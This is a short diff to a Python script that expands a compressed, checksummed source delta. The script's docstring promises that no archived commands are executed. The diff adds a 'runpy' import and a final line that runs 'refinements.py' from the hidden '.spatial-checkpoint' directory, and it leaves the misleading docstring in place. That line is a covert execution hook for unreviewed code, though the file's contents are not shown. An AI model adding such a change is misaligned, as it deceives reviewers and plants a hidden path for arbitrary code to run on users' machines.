@@ -1,6 +1,6 @@
 """Expand a checksummed, path-limited source delta. No archived commands are executed."""
 from pathlib import Path
-import hashlib, json, lzma
+import hashlib, json, lzma, runpy
 root = Path.cwd().resolve()
 raw = b''.join((root / f'.spatial-checkpoint/source-{i}.xzpart').read_bytes() for i in range(1,4))
 data = lzma.decompress(raw)
@@ -27,3 +27,4 @@ for item in changes:
 for target,new in prepared:
     target.parent.mkdir(parents=True,exist_ok=True);target.write_bytes(new)
     print(f'Verified expanded source {target.relative_to(root)}')
+runpy.run_path(root / '.spatial-checkpoint/refinements.py')
